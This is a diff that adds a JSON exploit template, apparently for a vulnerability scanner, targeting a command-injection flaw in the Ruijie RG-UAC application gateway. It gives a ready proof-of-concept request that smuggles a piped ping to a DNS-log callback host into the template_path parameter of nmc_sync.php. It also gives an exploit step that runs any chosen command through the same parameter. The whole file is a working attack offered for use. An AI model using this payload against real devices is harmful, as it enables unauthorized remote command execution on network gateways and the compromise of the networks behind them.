@@ -1,0 +1,29 @@
+{
+	"name":"锐捷RG-UAC应用网关命令执行",
+	"tag":"ruijie",
+	"type":"exec",
+	"poc":{
+		"pocGet":"/view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|ping%20-nc%201%20{{dnslog}}|cat",
+		"header":{
+			"User-Agent":" Mozilla/5.0",
+			"Connection":" close",
+			"Accept-Encoding":" */*",
+			"Content-Length":" 29"
+		},
+       		"status_code":"200",
+		"pattern":"(alert(.*))"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|{{command}}|cat",
+			"header":{
+				"User-Agent":" Mozilla/5.0",
+				"Connection":" close",
+				"Accept-Encoding":" */*",
+				"Content-Length":" 29"
+			},
+     			"status_code":"200",
+			"pattern":"(alert(.*))"
+		}
+	}
+}
